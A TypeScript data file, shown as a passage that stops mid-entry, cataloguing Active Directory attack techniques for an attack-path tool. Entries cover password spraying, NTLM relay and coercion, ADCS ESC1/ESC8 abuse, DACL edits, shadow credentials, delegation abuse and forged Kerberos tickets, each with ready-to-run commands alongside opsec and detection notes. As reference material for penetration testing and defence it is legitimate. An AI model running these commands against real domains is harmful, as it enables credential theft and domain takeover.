import type { AttackEdge, TechniqueNodeDef } from '../schema';

const r = String.raw;
const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

/**
 * Expanded AD techniques (web-verified) that connect into the three base
 * chains: extra footholds, ADCS, DACL/ACL abuse, delegations, Kerberos ticket
 * abuse, lateral movement, and a couple of critical CVEs.
 */
export const adAdditionNodes: TechniqueNodeDef[] = [
  {
    id: 'username-enum-kerbrute',
    label: 'Username Enumeration',
    phase: 'recon',
    summary: 'Validate AD usernames via Kerberos pre-auth, no creds.',
    description:
      'Kerbrute (and similar tools) send AS-REQs with no pre-authentication: existing accounts return KRB5KDC_ERR_PREAUTH_REQUIRED, unknown ones return KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, so valid usernames are confirmed with no credentials and without incrementing bad-password counters (no account lockout). The validated list seeds password spraying and AS-REP roasting.',
    tools: [
      { name: 'Kerbrute', url: 'https://github.com/ropnop/kerbrute' },
      { name: 'smartbrute', url: 'https://github.com/ShutdownRepo/smartbrute' },
      { name: 'nmap krb5-enum-users', url: 'https://nmap.org/nsedoc/scripts/krb5-enum-users.html' },
    ],
    commands: [
      {
        label: 'Enumerate valid usernames (Kerbrute)',
        code: r`kerbrute userenum -d domain.local --dc 10.0.0.1 usernames.txt`,
        lang: 'bash',
      },
      {
        label: 'Enumerate via nmap',
        code: r`nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.LOCAL',userdb=users.txt 10.0.0.1`,
        lang: 'bash',
      },
    ],
    requires: ['Network access to a Domain Controller', 'A candidate username list'],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'HackTricks, Password Spraying / Brute Force', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/password-spraying.html' },
      { label: 'The Hacker Recipes, Pre-auth bruteforce', url: 'https://www.thehacker.recipes/ad/movement/kerberos/pre-auth-bruteforce' },
    ],
    opsec: 'Bulk AS-REQ enumeration generates Kerberos pre-auth events (4768) on the DC, but does not increment badPwdCount so it will not lock accounts. High volume is detectable.',
    difficulty: 'easy',
  },
  {
    id: 'rid-cycling',
    label: 'RID Cycling',
    phase: 'recon',
    summary: 'Brute-force RIDs over a null SMB session to list users.',
    description:
      'Where a host permits null or anonymous SMB sessions, the domain SID is recovered and appended with sequential RIDs to resolve account names. This yields a user/computer list with no credentials, feeding spraying and roasting.',
    tools: [
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'impacket lookupsid', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'RID brute via null session', code: r`nxc smb 10.0.0.1 -u '' -p '' --rid-brute 4000`, lang: 'bash' },
      { label: 'Impacket lookupsid (null)', code: r`lookupsid.py 'domain.local/anonymous:@10.0.0.1'`, lang: 'bash' },
    ],
    requires: ['Null/anonymous SMB or RPC access to the DC'],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'The Hacker Recipes, MS-RPC recon', url: 'https://www.thehacker.recipes/ad/recon/ms-rpc' },
    ],
    opsec: 'Many SAMR/RPC lookups against the DC are visible; modern DCs frequently disable anonymous access (RestrictAnonymous), so this often fails on hardened domains.',
    difficulty: 'easy',
  },
  {
    id: 'anon-ldap-dump',
    label: 'Anonymous LDAP Dump',
    phase: 'recon',
    summary: 'Dump directory objects via an LDAP anonymous/null bind.',
    description:
      'If the directory permits an anonymous (null) LDAP bind, you can enumerate users, groups, and computers without credentials; even a low-privilege bind reveals the full object graph. Useful for mapping and to feed BloodHound/spraying.',
    tools: [
      { name: 'windapsearch', url: 'https://github.com/ropnop/windapsearch' },
      { name: 'ldapdomaindump', url: 'https://github.com/dirkjanm/ldapdomaindump' },
    ],
    commands: [
      { label: 'Enumerate users via anonymous bind', code: r`windapsearch --dc-ip 10.0.0.1 -m users`, lang: 'bash' },
      { label: 'Full dump (low-priv bind)', code: r`ldapdomaindump ldap://10.0.0.1 -u 'domain.local\user' -p pass -o loot/`, lang: 'bash' },
    ],
    requires: ['LDAP reachable', 'Anonymous bind allowed (or any low-priv account)'],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'The Hacker Recipes, LDAP recon', url: 'https://www.thehacker.recipes/ad/recon/ldap' },
    ],
    opsec: 'Anonymous LDAP bind is disabled by default on modern AD; success usually indicates legacy/misconfigured DCs. Queries are logged but blend with normal LDAP traffic.',
    difficulty: 'easy',
  },
  {
    id: 'password-spraying',
    label: 'Password Spraying',
    phase: 'credential-access',
    summary: 'Try one common password across many accounts.',
    description:
      'Rather than many passwords against one account (which locks it), spray a single likely password (e.g. Season+Year) across the whole user list. Spraying over Kerberos (AS-REQ pre-auth) is often stealthier than SMB/LDAP (it frequently avoids 4625 logon-failure events) but still increments badPwdCount, so low-and-slow timing under the lockout threshold is essential. A single hit yields valid domain credentials.',
    tools: [
      { name: 'Kerbrute', url: 'https://github.com/ropnop/kerbrute' },
      { name: 'smartbrute', url: 'https://github.com/ShutdownRepo/smartbrute' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Spray via Kerberos', code: r`kerbrute passwordspray -d domain.local --dc 10.0.0.1 users.txt 'Spring2025!'`, lang: 'bash' },
      { label: 'Spray over SMB', code: r`nxc smb 10.0.0.1 -u users.txt -p 'Spring2025!' --continue-on-success`, lang: 'bash' },
    ],
    requires: ['A valid username list', 'Knowledge/guess of the lockout policy'],
    mitre: mitre('T1110.003'),
    references: [
      { label: 'HackTricks, Password Spraying', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/password-spraying.html' },
      { label: 'The Hacker Recipes, Pre-auth bruteforce', url: 'https://www.thehacker.recipes/ad/movement/kerberos/pre-auth-bruteforce' },
      { label: 'The Hacker Recipes, Password policy', url: 'https://www.thehacker.recipes/ad/recon/password-policy' },
    ],
    opsec: 'Each failed bind increments badPwdCount; SMB/LDAP spraying generates 4625/4771, while Kerberos pre-auth spraying may avoid 4625 (only 4768/4771). Read the lockout policy first, throttle to one attempt per account per window, and pause before the threshold.',
    difficulty: 'easy',
  },
  {
    id: 'mitm6-relay',
    label: 'IPv6 DNS Takeover (DHCPv6)',
    phase: 'initial-access',
    summary: 'Spoof DHCPv6/DNS over IPv6, then relay NTLM.',
    description:
      'Windows prefers IPv6 and auto-requests a DHCPv6 lease. mitm6 answers as a rogue DHCPv6 server, sets itself as the victim DNS, and spoofs WPAD to coerce NTLM auth. Paired with ntlmrelayx, the captured auth is relayed to LDAP(S) to grant rights or configure RBCD: domain compromise with no creds.',
    tools: [
      { name: 'mitm6', url: 'https://github.com/dirkjanm/mitm6' },
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Spoof DHCPv6/DNS for the domain', code: r`mitm6 -d domain.local`, lang: 'bash' },
      { label: 'Relay to LDAPS, set delegation rights', code: r`ntlmrelayx.py -6 -t ldaps://dc01 -wh wpad.domain.local --delegate-access`, lang: 'bash' },
    ],
    requires: ['Layer-2 access to the segment', 'IPv6 enabled on victims (default)'],
    mitre: mitre('T1557.003'),
    opsec: 'Rogue DHCPv6/DNS is detectable and disrupts IPv6 on the segment. Use -d to scope to target domains; defenders monitor for unexpected DHCPv6 advertisements.',
    difficulty: 'medium',
  },
  {
    id: 'coerced-auth',
    label: 'Coerced Authentication',
    phase: 'credential-access',
    summary: 'Force a machine (or DC) to authenticate to you.',
    description:
      'Authenticated RPC calls force a target, often a Domain Controller, to initiate NTLM auth back to an attacker host. PetitPotam (MS-EFSRPC), PrinterBug (MS-RPRN), and the multi-method Coercer all trigger this. The coerced auth is then relayed (to LDAP, ADCS web enrollment for ESC8) or captured by a host with unconstrained delegation.',
    tools: [
      { name: 'Coercer', url: 'https://github.com/p0dalirius/Coercer' },
      { name: 'PetitPotam', url: 'https://github.com/topotam/PetitPotam' },
      { name: 'krbrelayx', url: 'https://github.com/dirkjanm/krbrelayx' },
      { name: 'NetExec (coerce_plus)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Multi-method coercion', code: r`Coercer coerce -u user -p pass -t 10.0.0.10 -l 10.0.0.50 -d domain.local`, lang: 'bash' },
      { label: 'PetitPotam (EFSRPC) coercion', code: r`PetitPotam.py -u user -p pass -d domain.local 10.0.0.50 10.0.0.10`, lang: 'bash' },
      { label: 'Check / fire coercion vectors (NetExec coerce_plus)', code: r`nxc smb <target> -u user -p pass -M coerce_plus -o LISTENER=<attacker_ip>`, lang: 'bash' },
    ],
    requires: ['Usually a valid domain account', 'Reachable RPC service (EFSRPC/RPRN/DFSNM) on the target'],
    mitre: mitre('T1187'),
    opsec: 'Coercion RPC calls and the resulting outbound auth to an unusual host are increasingly detected and many vectors are patched. Have your relay/capture listener running first.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, Printers Spooler Service Abuse (Coercion)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html' },
    ],
  },
  {
    id: 'adcs-esc1',
    label: 'ADCS ESC1 (Arbitrary SAN)',
    phase: 'priv-esc',
    summary: 'Enroll a cert as any user via Enrollee-Supplies-Subject.',
    description:
      'ESC1 is the most common AD CS misconfiguration: a template with Client Authentication EKU, ENROLLEE_SUPPLIES_SUBJECT enabled, and enrollment open to low-priv users. Request a certificate specifying an arbitrary UPN/SID (e.g. a Domain Admin), then authenticate with it to recover the target NT hash or a TGT. One of the ESC1–ESC8+ family.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Find vulnerable templates', code: r`certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -vulnerable -stdout`, lang: 'bash' },
      { label: 'Request a cert impersonating a target', code: r`certipy req -u user@domain.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@domain.local`, lang: 'bash' },
      { label: 'Authenticate with the cert -> NT hash + TGT', code: r`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['A low-priv account with enrollment rights', 'A template vulnerable to ESC1'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },{ label: 'The Hacker Recipes, AD CS', url: 'https://www.thehacker.recipes/ad/movement/adcs/' }],
    opsec: 'Certificate requests are logged on the CA (Event ID 4886/4887); a request whose SAN/UPN differs from the requester is a strong indicator. Certificates remain valid past password resets.',
    difficulty: 'medium',
  },
  {
    id: 'adcs-esc8',
    label: 'ADCS ESC8 (Relay to Web Enrollment)',
    phase: 'priv-esc',
    summary: 'Relay coerced NTLM to the AD CS web enrollment endpoint.',
    description:
      'ESC8 needs no vulnerable template: the AD CS HTTP web enrollment interface accepts NTLM. Coerce a Domain Controller to authenticate, relay that NTLM to the certsrv endpoint, and obtain a certificate for the DC machine account, which yields a TGT and DCSync.',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Relay to web enrollment', code: r`ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController`, lang: 'bash' },
      { label: 'Then coerce the DC to authenticate', code: r`Coercer coerce -u user -p pass -t dc01.domain.local -l 10.0.0.50`, lang: 'bash' },
    ],
    requires: ['AD CS web enrollment enabled (HTTP, no EPA)', 'A coercion vector to a privileged machine'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC8)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },{ label: 'The Hacker Recipes, AD CS web endpoints', url: 'https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints' }],
    opsec: 'Combines coercion (noisy) with relay and a cross-account cert request: multiple high-fidelity detections. Mitigated by EPA / HTTPS-only on certsrv.',
    difficulty: 'hard',
  },
  {
    id: 'acl-genericall',
    label: 'GenericAll',
    phase: 'priv-esc',
    summary: 'Full control over an object → the abuse depends on its type.',
    description:
      'GenericAll is full control over a target object: it implies WriteDacl, WriteOwner, every property write, and the control-access rights. The abuse depends on the object TYPE: over a USER, reset the password (ForceChangePassword), write a shadow credential, or set an SPN to Kerberoast; over a GROUP, add a member; over a COMPUTER, configure RBCD or read LAPS; over the DOMAIN object, grant yourself DCSync. The widest single BloodHound edge.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add genericAll <target> <attacker>', lang: 'bash' },
      { label: 'Grant yourself GenericAll over a target', code: r`bloodyAD -H 10.0.0.1 -d domain.local -u user -p pass add genericAll TARGET attacker`, lang: 'bash' },
    ],
    requires: ['GenericAll over a target object from an owned principal'],
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound GenericAll edge', url: 'https://bloodhound.specterops.io/resources/edges/generic-all' },{ label: 'The Hacker Recipes, DACL abuse', url: 'https://www.thehacker.recipes/ad/movement/dacl/' }],
    opsec: 'DACL writes generate directory-change events (4662/5136). Revert added ACEs after use; choose the lowest-noise follow-on the edge allows.',
    difficulty: 'medium',
  },
  {
    id: 'acl-genericwrite',
    label: 'GenericWrite',
    phase: 'priv-esc',
    summary: "Write a target's attributes, but NOT its DACL or owner.",
    description:
      "GenericWrite lets you write a target's attributes, but (unlike GenericAll) NOT its DACL or owner, and not the control-access rights. So it grants NO DCSync and NO password reset; instead you abuse specific writable attributes: set an SPN to Kerberoast, flip DONT_REQ_PREAUTH for AS-REP roasting, write msDS-KeyCredentialLink for shadow credentials, write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD (over a computer), set scriptPath for a logon script, or write a group's member attribute.",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Set an SPN on a target user (→ Kerberoast)', code: r`bloodyAD -H 10.0.0.1 -d domain.local -u user -p pass set object TARGET servicePrincipalName -v 'HOST/x'`, lang: 'bash' },
      { label: 'Add a shadow credential', code: r`bloodyAD -H 10.0.0.1 -d domain.local -u user -p pass add shadowCredentials TARGET`, lang: 'bash' },
    ],
    requires: ['GenericWrite (or WriteProperty on a specific attribute) over the target'],
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound GenericWrite edge', url: 'https://bloodhound.specterops.io/resources/edges/generic-write' },
    ],
    opsec: 'Attribute writes log 4662/5136. Shadow credentials and SPN-set are quieter than a password reset and easily reverted, so prefer them.',
    difficulty: 'medium',
  },
  {
    id: 'acl-forcechangepassword',
    label: 'ForceChangePassword',
    phase: 'priv-esc',
    summary: "Reset a target user's password without the old one.",
    description:
      'The User-Force-Change-Password extended right lets you set a target user password without knowing the current one. Reset it, then log in as that user: a direct identity takeover, often the cheapest edge from a low-priv user to a privileged account.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'Impacket', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 set password <target> <NewPass123!>', lang: 'bash' },
      { label: 'Force-reset the target password', code: r`bloodyAD -H 10.0.0.1 -d domain.local -u user -p pass set password TARGET 'Newp@ss123!'`, lang: 'bash' },
    ],
    requires: ['ForceChangePassword (or GenericAll) over the target user'],
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound ForceChangePassword edge', url: 'https://bloodhound.specterops.io/resources/edges/force-change-password' },{ label: 'The Hacker Recipes, DACL abuse', url: 'https://www.thehacker.recipes/ad/movement/dacl/' }],
    opsec: 'A password reset is auditable (Event ID 4724) and locks out the legitimate user. Prefer shadow credentials or targeted Kerberoast when stealth matters.',
    difficulty: 'easy',
  },
  {
    id: 'acl-addself-group',
    label: 'AddSelf / AddMember to Group',
    phase: 'priv-esc',
    summary: 'Add yourself to a privileged group.',
    description:
      'With Self-Membership (AddSelf), GenericWrite/GenericAll, or WriteProperty on a group member attribute, add your principal to it. If the group is privileged (e.g. Domain Admins, or one nested into it), you inherit its rights immediately.',
    tools: [{ name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' }],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add groupMember <group> <attacker>', lang: 'bash' },
      { label: 'Add a member to a target group', code: r`bloodyAD -H 10.0.0.1 -d domain.local -u user -p pass add groupMember 'Domain Admins' attacker`, lang: 'bash' },
    ],
    requires: ['AddSelf / write-member right over a privileged group'],
    mitre: mitre('T1098.007'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound AddSelf edge', url: 'https://bloodhound.specterops.io/resources/edges/add-self' },{ label: 'The Hacker Recipes, DACL abuse', url: 'https://www.thehacker.recipes/ad/movement/dacl/' }],
    opsec: 'Membership changes to protected groups are high-signal (4728/4756) and may be reverted by AdminSDHolder/SDProp. Remove yourself promptly.',
    difficulty: 'easy',
  },
  {
    id: 'shadow-credentials',
    label: 'Shadow Credentials',
    phase: 'credential-access',
    summary: 'Write msDS-KeyCredentialLink -> PKINIT as the target.',
    description:
      'With write rights over a target msDS-KeyCredentialLink (via GenericWrite/GenericAll), add an attacker-controlled key credential, then authenticate via PKINIT to obtain a TGT and the target NT hash: no password reset, and easily reverted. Requires a PKINIT-capable DC (AD CS / a KDC cert).',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'pyWhisker', url: 'https://github.com/ShutdownRepo/pywhisker' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add shadowCredentials <target>', lang: 'bash' },
      { label: 'Auto add/auth/cleanup (Certipy)', code: r`certipy shadow auto -u user@domain.local -p pass -account TARGET -dc-ip 10.0.0.1`, lang: 'bash' },
      { label: 'Add a key credential (pyWhisker)', code: r`pywhisker -d domain.local -u user -p pass --target TARGET --action add`, lang: 'bash' },
    ],
    requires: ['GenericWrite/GenericAll over the target msDS-KeyCredentialLink', 'PKINIT-capable DC (AD CS / KDC cert)'],
    versions: ['srv2016', 'srv2019', 'srv2022', 'srv2025'],
    affects: 'Key Trust / msDS-KeyCredentialLink mapping requires a Server 2016+ DC (the attribute and PKINIT key-trust support landed in 2016).',
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Shadow Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.html' },
      { label: 'SpecterOps, Shadow Credentials', url: 'https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab' },{ label: 'The Hacker Recipes, Shadow Credentials', url: 'https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials' }],
    opsec: 'Stealthier than a password reset (no lockout, attribute restored after use), but the key-credential write and PKINIT logon are auditable. Clean up the msDS-KeyCredentialLink value afterward.',
    difficulty: 'medium',
  },
  {
    id: 'targeted-kerberoast',
    label: 'Targeted Kerberoasting',
    phase: 'credential-access',
    summary: 'Set a temp SPN on a controlled user, then roast it.',
    description:
      'With GenericWrite/GenericAll over a target user that has no SPN, temporarily set a servicePrincipalName, request a TGS, then remove the SPN. The TGS is encrypted with the target password hash and cracked offline, turning a write-ACL edge into a credential.',
    tools: [{ name: 'targetedKerberoast', url: 'https://github.com/ShutdownRepo/targetedKerberoast' }],
    commands: [
      { label: 'Set SPN, roast, then clean up', code: r`targetedKerberoast.py -d domain.local -u user -p pass --request-user TARGET --dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['GenericWrite/GenericAll over the target user', 'Target password crackable offline'],
    mitre: mitre('T1558.003'),
    references: [
      { label: 'HackTricks, Kerberoast', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html' },{ label: 'The Hacker Recipes, Targeted Kerberoasting', url: 'https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting' }],
    opsec: 'Setting an SPN and the TGS request are logged (5136 / 4769). The tool removes the SPN automatically, but the brief change is detectable; cracking is offline.',
    difficulty: 'medium',
  },
  {
    id: 'constrained-delegation',
    label: 'Constrained Delegation (S4U2Proxy)',
    phase: 'lateral-movement',
    summary: 'Abuse KCD to impersonate any user to allowed SPNs.',
    description:
      'An account configured for constrained delegation (msDS-AllowedToDelegateTo) can use S4U2Self + S4U2Proxy to get a service ticket impersonating an arbitrary user to the allowed SPNs. If you hold that account key, impersonate Administrator to the target service. The alt-service trick widens the SPN reached.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'getST (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'S4U with Rubeus', code: r`Rubeus.exe s4u /user:websvc$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt`, lang: 'powershell' },
      { label: 'S4U with Impacket getST', code: r`getST.py -spn cifs/target.domain.local -impersonate Administrator -hashes :<HASH> domain.local/websvc$`, lang: 'bash' },
    ],
    requires: ['Control of an account with msDS-AllowedToDelegateTo set', "That account's hash/key"],
    references: [
      { label: 'HackTricks, Constrained Delegation', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html' },{ label: 'The Hacker Recipes, Constrained Delegation', url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained' }],
    opsec: 'S4U2Self/S4U2Proxy TGS requests (4769) for a sensitive impersonated user are detectable. The alt-service SPN-substitution trick (e.g. cifs vs host) expands access beyond the configured SPN.',
    difficulty: 'hard',
  },
  {
    id: 'rbcd',
    label: 'Resource-Based Constrained Delegation',
    phase: 'lateral-movement',
    summary: 'Write msDS-AllowedToActOnBehalfOfOtherIdentity -> impersonate.',
    description:
      'If you can write a target computer msDS-AllowedToActOnBehalfOfOtherIdentity, point it at a machine account you control (default MachineAccountQuota allows 10), then use S4U2Self+S4U2Proxy to impersonate any user to that host. A common outcome of a GenericWrite/GenericAll edge over a computer or an LDAP relay.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'Impacket (addcomputer/rbcd/getST)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add rbcd <target$> <attacker$>', lang: 'bash' },
      { label: 'Add a controlled machine account', code: r`addcomputer.py -computer-name 'evil$' -computer-pass 'Passw0rd!' domain.local/user:pass -dc-ip 10.0.0.1`, lang: 'bash' },
      { label: 'Write RBCD on the target computer', code: r`rbcd.py -delegate-to 'TARGET$' -delegate-from 'evil$' -action write domain.local/user:pass`, lang: 'bash' },
      { label: 'Get an impersonation ticket', code: r`getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/evil$:'Passw0rd!'`, lang: 'bash' },
      { label: 'Abuse configured RBCD to impersonate (NetExec)', code: r`nxc smb <target> -u 'attacker$' -H <hash> --delegate Administrator`, lang: 'bash' },
    ],
    requires: ['Write over the target computer msDS-AllowedToActOnBehalfOfOtherIdentity', 'Ability to create/control a machine account'],
    references: [
      { label: 'HackTricks, Resource-based Constrained Delegation', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html' },
      { label: 'SpecterOps, Wagging the Dog (RBCD)', url: 'https://posts.specterops.io/wagging-the-dog-abusing-resource-based-constrained-delegation-to-attack-active-directory-1d04ca246da6' },{ label: 'The Hacker Recipes, RBCD', url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd' }],
    opsec: 'Machine-account creation (4741), the delegation write (5136), and S4U requests (4769) are all logged. Setting MachineAccountQuota to 0 mitigates the account-creation step.',
    difficulty: 'medium',
  },
  {
    id: 'overpass-the-hash',
    label: 'OverPass-the-Hash',
    phase: 'lateral-movement',
    summary: 'Turn an NT hash (or AES key) into a Kerberos TGT.',
    description:
      'Instead of NTLM Pass-the-Hash, use a captured NT hash or AES key to request a Kerberos TGT ("pass the key"), then operate over Kerberos. Blends in better than NTLM and enables Pass-the-Ticket.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'getTGT (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Request a TGT from an NT hash (Rubeus)', code: r`Rubeus.exe asktgt /user:Administrator /rc4:<NTHASH> /domain:domain.local /ptt`, lang: 'powershell' },
      { label: 'Request a TGT from a hash (Impacket)', code: r`getTGT.py domain.local/Administrator -hashes :<NTHASH>`, lang: 'bash' },
    ],
    requires: ['An NT hash or AES key for the target account'],
    mitre: mitre('T1550.002'),
    opsec: 'Quieter than NTLM PtH, but an AS-REQ using RC4 when the account supports AES is anomalous. Prefer the AES key (/aes256) where available.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, OverPass-the-Hash / Pass-the-Key', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.html' },
    ],
  },
  {
    id: 'pass-the-ticket',
    label: 'Pass-the-Ticket',
    phase: 'lateral-movement',
    summary: 'Inject a stolen/forged Kerberos ticket into a session.',
    description:
      'Reuse a Kerberos ticket (TGT or TGS) you stole from memory or forged (silver/golden) by injecting it into a logon session: authenticate as that principal with no password. On Windows the ticket is loaded with Rubeus/Mimikatz (.kirbi); on Linux the same idea is "pass-the-cache", where you point KRB5CCNAME at a .ccache (converting formats with impacket ticketConverter if needed). The convergence point for OverPass-the-Hash, Silver, and Golden tickets.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'Impacket (ticketConverter)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Inject a ticket on Windows (Rubeus)', code: r`Rubeus.exe ptt /ticket:ticket.kirbi`, lang: 'powershell' },
      { label: 'Pass-the-cache on Linux (.ccache)', code: r`export KRB5CCNAME=ticket.ccache && psexec.py -k -no-pass domain.local/Administrator@target`, lang: 'bash' },
      { label: 'Convert .kirbi <-> .ccache', code: r`ticketConverter.py ticket.kirbi ticket.ccache`, lang: 'bash' },
    ],
    requires: ['A valid stolen or forged Kerberos ticket (.kirbi or .ccache)'],
    mitre: mitre('T1550.003'),
    references: [
      { label: 'HackTricks, Pass the Ticket', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html' },
      { label: 'MITRE ATT&CK, Pass the Ticket (T1550.003)', url: 'https://attack.mitre.org/techniques/T1550/003/' },
    ],
    opsec: 'Ticket use itself is normal Kerberos; anomalies come from lifetime, encryption type, or a TGT appearing on an unexpected host. Match realistic lifetimes/etypes.',
    difficulty: 'medium',
  },
  {
    id: 'silver-ticket',
    label: 'Silver Ticket',
    phase: 'lateral-movement',
    summary: "Forge a TGS from a service account's hash.",
    description:
      "With a service account's password hash (e.g. from Kerberoasting or a machine account), forge a TGS directly for that service SPN: no KDC interaction, so it never touches a DC. Scoped to one service on one host but stealthy and offline to create.",
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Forge a silver ticket (Impacket)', code: r`ticketer.py -nthash <SVC_HASH> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local Administrator`, lang: 'bash' },
      { label: 'Forge + inject (Rubeus)', code: r`Rubeus.exe silver /service:cifs/target.domain.local /rc4:<SVC_HASH> /user:Administrator /domain:domain.local /sid:<SID> /ptt`, lang: 'powershell' },
    ],
    requires: ['The target service account hash (NT or AES)', 'Domain SID'],
    mitre: mitre('T1558.002'),
    opsec: 'No DC contact at forge time; detection relies on host-side TGS anomalies and (where enabled) PAC validation. A forged PAC without a real AS/TGS exchange can be caught by KDC PAC checks.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, Silver Ticket', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html' },
    ],
  },
  {
    id: 'zerologon',
    label: 'ZeroLogon (CVE-2020-1472)',
    phase: 'priv-esc',
    summary: "Netlogon flaw resets the DC machine password to empty.",
    description:
